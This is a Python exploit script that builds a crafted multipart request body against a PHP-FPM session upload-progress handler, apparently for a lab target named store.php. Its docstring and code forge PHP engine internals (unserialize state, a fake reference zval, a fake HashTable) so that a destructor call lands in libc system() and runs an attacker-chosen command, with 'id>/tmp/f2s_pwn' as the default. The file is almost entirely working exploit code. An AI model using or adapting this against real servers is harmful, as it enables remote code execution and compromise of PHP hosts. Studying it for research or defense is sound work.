#!/usr/bin/env python3
"""Build the store-request body for the FPM orphan chain.

The lab victim endpoint (store.php) does:

    session_start();
    $_SESSION['p'] = $_POST['p'];
    $_SESSION['upload_progress_fk1'] = &$_SESSION['p'];
    session_write_close();

so the php session serializer writes:

    p|s:LEN:"<payload>";upload_progress_fk1|R:1;

The payload carries a forged php_unserialize_data at file offset --struct-off.
When B's multipart upload-progress callback reads the file, the session read
buffer is allocated such that that file offset maps onto the stale decoder
address D left by request A.

At D:
    last               = D + 56        (inline var_entries)
    entries.used_slots = 1018          (var_push allocates a fresh block,
                                        leaving entries.data[] forged)
    entries.data[i]    = V             (fake zval IS_REFERENCE -> R)

R:1 in the file resolves through entries.data[0] to V.  The decoded reference
is stored under key upload_progress_fk1; B's own progress update replaces that
key with the real progress array, zval_ptr_dtor()s the forged reference and
lands in the fake HashTable pDestructor = libc system().

Fake HashTable tuning for the encode that may run before the replacement:
    nNumUsed       = 1  -> destructor loop visits the bucket
    nNumOfElements = 0  -> serializer emits a:0:{} and never reads arData
    flags          = HASH_FLAG_STATIC_KEYS
    arData         = command string; pDestructor = system

usage:
  python3 m3_app.py --d 0x... --system 0x... --out body.bin
"""
from __future__ import annotations

import argparse
import struct

IS_REFERENCE_EX = 10 | (1 << 8)          # 0x10a
IS_ARRAY_EX = 7 | (1 << 8)               # 0x107

BOUNDARY = b"----f2sstore00000000"
KEY = b"upload_progress_fk1"
STRUCT_SIZE = 8216                       # sizeof(php_unserialize_data) on 8.3.x


def q(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)


def d32(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def build_payload(d: int, system_addr: int, length: int, struct_file_off: int,
                  cmd: bytes) -> bytes:
    prefix_len = len(b'p|s:%d:"' % length)
    struct_off = struct_file_off - prefix_len
    if struct_off < 0:
        raise SystemExit("struct file offset smaller than session prefix")

    payload = bytearray(b"P" * length)
    V = d + 0x2100
    R = d + 0x2180
    S = d + 0x2200
    CMD = d + 0x2300

    # forged php_unserialize_data at D (var_entries starts at D + 56)
    st = bytearray(STRUCT_SIZE)
    q(st, 0, d + 56)              # last = &entries
    q(st, 56, 1018)               # entries.used_slots -> force new block
    q(st, 64, 0)                  # entries.next
    for i in range(1018):
        q(st, 72 + 8 * i, V)      # entries.data[i] -> fake zval
    payload[struct_off:struct_off + len(st)] = st

    def put(addr: int, data: bytes) -> None:
        off = struct_off + (addr - d)
        if off < 0 or off + len(data) > length:
            raise SystemExit("structure %#x outside payload" % addr)
        payload[off:off + len(data)] = data

    # fake zval at V: IS_REFERENCE -> R
    zv = bytearray(16)
    q(zv, 0, R)
    d32(zv, 8, IS_REFERENCE_EX)
    d32(zv, 12, 0)
    put(V, bytes(zv))

    # fake zend_reference at R: rc=0 (ZVAL_COPY makes it 1), val = fake array
    ref = bytearray(32)
    d32(ref, 0, 0)
    d32(ref, 4, 10)               # gc.type_info = IS_REFERENCE
    q(ref, 8, S)
    d32(ref, 16, IS_ARRAY_EX)
    d32(ref, 20, 0)
    q(ref, 24, 0)                 # sources = 0
    put(R, bytes(ref))

    # fake HashTable at S
    ht = bytearray(0x38)
    d32(ht, 0x00, 1)              # gc.refcount = 1
    d32(ht, 0x04, 7)              # gc.type_info = IS_ARRAY
    d32(ht, 0x08, 0x10)           # flags = HASH_FLAG_STATIC_KEYS
    d32(ht, 0x0C, 0xFFFFFFF8)     # nTableMask
    q(ht, 0x10, CMD)              # arData = command
    d32(ht, 0x18, 1)              # nNumUsed = 1
    d32(ht, 0x1C, 0)              # nNumOfElements = 0 (serializer-safe)
    d32(ht, 0x20, 8)              # nTableSize
    d32(ht, 0x24, 0)
    q(ht, 0x28, 0)                # nNextFreeElement
    q(ht, 0x30, system_addr)      # pDestructor = system
    put(S, bytes(ht))

    put(CMD, cmd + b"\x00")

    return bytes(payload)


def build_body(payload: bytes) -> bytes:
    return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"p\""
            b"\r\n\r\n" + payload + b"\r\n--" + BOUNDARY + b"--\r\n")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--d", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--system", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--length", type=int, default=65500)
    ap.add_argument("--struct-off", type=lambda x: int(x, 0), default=0x1FE8)
    ap.add_argument("--cmd", default="id>/tmp/f2s_pwn")
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    cmd = args.cmd.encode()
    payload = build_payload(args.d, args.system, args.length, args.struct_off, cmd)
    body = build_body(payload)
    prefix_len = len(b'p|s:%d:"' % args.length)
    tail = b'";' + KEY + b"|R:1;"
    print("payload=%d prefix=%d struct_payload_off=%#x file_len=%d alloc=%d"
          % (len(payload), prefix_len, args.struct_off - prefix_len,
             prefix_len + len(payload) + len(tail),
             prefix_len + len(payload) + len(tail) + 25))
    print("V=%#x R=%#x S=%#x CMD=%#x system=%#x" %
          (args.d + 0x2100, args.d + 0x2180, args.d + 0x2200,
           args.d + 0x2300, args.system))
    with open(args.out, "wb") as fh:
        fh.write(body)
    with open(args.out + ".payload", "wb") as fh:
        fh.write(payload)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
